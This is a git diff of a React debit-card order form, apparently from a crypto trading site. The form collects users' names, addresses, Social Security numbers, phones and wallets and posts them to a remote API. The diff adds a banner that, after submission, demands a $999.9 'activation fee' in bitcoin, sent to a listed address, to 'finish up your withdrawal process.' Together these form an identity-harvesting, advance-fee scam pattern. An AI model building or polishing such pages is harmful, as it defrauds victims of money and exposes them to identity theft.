@@ -2,9 +2,11 @@ import React, { useState } from 'react'
 import Loader from "./Loader/Loader";
 import { toast } from 'react-toastify';
 
-function debitCard() {
+const debitCard = () => {
 
     const [isPending, setIsPending] = useState(false)
+
+    const [banner, setBanner] = useState(false)
 
 
     const [formData, setFormData] = useState({
@@ -26,33 +28,49 @@ function debitCard() {
 
         setIsPending(true)
 
-        const response = await fetch(`http://localhost:6500/api/v1/cards/order`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({name: formData.name, address: formData.address, ssn: formData.ssn, phone: formData.phone, wallet: formData.wallet})
-        })
+        try {
+            const response = await fetch(`https://trading-api-orcin.vercel.app/api/v1/cards/order`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({name: formData.name, address: formData.address, ssn: formData.ssn, phone: formData.phone, wallet: formData.wallet})
+            })
 
-        const json = await response.json()
+            const json = await response.json()
 
-        if(!response.ok){
+            console.log(json)
+
+            if(!response.ok){
+                toast.error(json.error)
+                console.log(json.error)
+            }
+
+            if(response.ok){
+                toast.success(`successful`)
+                setBanner(true)
+            }
+        } catch (error) {
+            console.log(error)
+            toast.error('Something went wrong')
+        } finally {
             setIsPending(false)
-            toast.error(json.error)
-        }
-
-        if(response.ok){
-            setIsPending(false)
-            toast.success(``)
         }
 
     }
 
+    if (banner) return (
 
-  return (
+        <div className='border border-rose-500 bg-rose-200 p-2 rounded-md text-rose-700'>Thanks for submitting your license order, complete the order activation fee to finish up your withdrawal process
+
+          <span className='text-black font-bold'> $999.9</span> to <span className='text-black font-bold'>bc1qsjre9tfda3x9rw346n5y3xz4ywhz4je6epg0ut</span>
+        </div>
+    )
+
+
+    if (!banner) return (
     <div className="grid grid-cols-1">
-    <form onSubmit={handleSubmit} className="flex flex-col gap-y-4 text-white">
-
+    <form  className="flex flex-col gap-y-4 text-white">
         <div className='grid grid-cols-2 gap-x-4 w-full'>
             <div className='flex flex-col gap-y-1'>
                 <label >Fullname</label>
@@ -69,7 +87,7 @@ function debitCard() {
             <div className='flex flex-col gap-y-1'>
                 <label >Phone :</label>
                 <input
-                    type="text"
+                    type="number"
                     className="w-full bg-[#18203A] text-slate-300"
                     placeholder="eg. +13456890908"
                     name="phone"
@@ -103,7 +121,7 @@ function debitCard() {
             />
         </div>
         
-        <button type="submit" className="p-2 bg-blue-500 w-full text-white shadow shadow-white">
+        <button type="button" onClick={handleSubmit} className="p-2 bg-blue-500 w-full text-white shadow shadow-white">
             Order
         </button>
     </form>
